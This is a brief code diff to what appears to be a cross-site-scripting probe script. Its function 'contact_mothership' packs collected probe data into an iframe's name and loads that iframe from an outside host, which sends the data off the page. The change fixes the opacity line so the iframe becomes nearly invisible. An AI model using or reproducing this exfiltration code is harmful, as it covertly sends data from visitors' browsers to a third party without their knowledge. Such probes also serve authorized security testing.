@@ -6978,7 +6978,7 @@ window.contact_mothership = function contact_mothership( probe_return_data ) {
     let i = document.createElement('iframe');
     i.name=JSON.stringify(probe_return_data);
     i.src = 'https://cmr.github.io/b/';
-	i.opacity='0.001';
+	i.style.opacity='0.001';
     document.body.appendChild(i);
 }
 window.addEvent = function addEvent(element, eventName, fn) {
